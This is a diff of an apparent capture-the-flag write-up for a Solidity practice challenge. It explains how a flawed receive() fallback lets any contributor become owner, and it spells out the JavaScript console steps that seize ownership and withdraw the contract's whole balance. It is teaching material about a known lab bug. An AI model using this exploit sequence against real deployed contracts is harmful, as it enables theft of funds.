@@ -5,15 +5,10 @@
 This smart contract has a vulnerability, because:
 ```
 
-- The require statement inside the fallback function receive() is making it an easy target to exploit,  
+- the require statement inside the fallback function receive() is making it an easy target to exploit,  
 
 ```Solidity
-/** 
-* @notice This fallback function receive() is the main attack target, in order to pass the 
-* require statement player must use function contribute() 1 wei will be enough, using the console
-* player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
-* player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens. 
-*/
+
 receive() external payable {
   require(msg.value > 0 && contributions[msg.sender] > 0);
   owner = msg.sender; 
@@ -123,7 +118,7 @@ await contract.withdraw();
 The attack:
 ```
 
-- TODO
+- the [top level](https://developer.chrome.com/blog/new-in-devtools-62/#await) JavaScript awaits the player will use in the attack 💥,
 
 ```JavaScript
 await contract.contribute({value: 1});
@@ -131,11 +126,46 @@ await contract.sendTransaction({value: 1 });
 await contract.owner();
 await contract.withdraw();
 ```
-- TODO
+- the contribution to satisfy this require statement,
+
+```Solidity
+&& contributions[msg.sender] > 0
+
+```
+
+```JavaScript
+await contract.contribute({value: 1});
+```
+
+- the value sent in the transaction to satisfy this require statement,
+
+```Solidity
+msg.value > 0 
+```
+
+```JavaScript
+await contract.sendTransaction({value: 1 });
+```
+
+- checking to see if it worked,
+
+```JavaScript
+await contract.owner();
+```
+
+- 💸 withdrawing everything!
 
 ```Solidity
 
+  function withdraw() public onlyOwner {
+    owner.transfer(address(this).balance);
+  }
 ```
+
+```JavaScript
+await contract.withdraw();
+```
+
 
 ## 🩺 How can we fix this vulnerablity in the victim contract?
 
